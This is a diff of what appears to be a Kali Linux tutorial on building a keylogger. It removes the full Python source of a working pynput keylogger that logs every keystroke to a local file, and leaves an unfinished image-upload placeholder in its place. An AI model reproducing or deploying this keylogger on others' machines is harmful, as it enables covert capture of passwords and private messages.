@@ -55,18 +55,7 @@ Pip - It is the package manager for Python that allows you to install libraries 
 
 Step-3 Open your Kali Linux home directory, create a file called keylogger.py using the Nano editor, and paste the code inside.
 
-from pynput import keyboard
-
-def on_press(key):
-    try:
-        with open("keylog.txt", "a") as f:
-            f.write(f"{key.char}\n")
-    except AttributeError:
-        with open("keylog.txt", "a") as f:
-            f.write(f"{key}\n")
-
-with keyboard.Listener(on_press=on_press) as listener:
-    listener.join()
+![Uploading image.png…]()
 
 Press Ctrl + O → Enter (to save)
 Press Ctrl + X (to exit)
